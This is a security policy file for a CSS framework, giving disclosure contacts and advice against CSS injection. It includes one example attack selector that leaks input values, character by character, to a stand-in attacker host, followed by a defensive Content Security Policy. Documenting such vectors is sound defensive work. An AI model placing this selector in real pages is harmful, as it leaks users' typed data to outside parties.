# SECURITY.md — Responsible Disclosure Policy

This guide contains the responsible disclosure policy for EaseMotion CSS alongside security best practices to mitigate CSS-injection vulnerabilities.

---

## Security Policy

We take the security of EaseMotion CSS seriously. If you believe you have found a security vulnerability in this framework, please report it privately:
- **Email**: contact security at `security@easemotion.io`
- Do **not** open a public GitHub issue for security disclosures.
- We will respond within 48 hours to coordinate a security patch rollout.

---

## Mitigating CSS-Injection Vulnerabilities

Because CSS features complex attribute selectors and external URL requests, rendering unvalidated user stylesheets introduces vectors for data exfiltration:

### 1. The Vector
Using `input[value^="a"] { background: url('https://attacker.com/log?char=a'); }`, an attacker can extract input keys as the user types by matching prefixes.

### 2. Remediation
To secure applications importing external stylesheets:
- Implement a strict **Content Security Policy (CSP)** restricting the domains from which elements can fetch images:
  ```http
  Content-Security-Policy: default-src 'self'; img-src 'self'; style-src 'self';
  ```
- Avoid importing user-submitted CSS or dynamically rendered style tags directly without validation.
